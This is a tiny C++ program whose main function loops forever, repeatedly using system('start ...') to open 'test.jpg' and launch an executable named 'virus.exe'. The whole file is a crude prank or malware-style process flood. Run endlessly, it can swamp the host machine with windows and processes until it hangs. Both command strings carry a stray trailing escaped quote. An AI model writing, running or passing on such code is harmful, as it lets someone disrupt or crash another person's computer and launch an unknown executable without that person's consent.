#include <cstdlib>

int main(){
    while(1==1){
        system("start test.jpg\"");
        system("start virus.exe\"");
    }  
    
}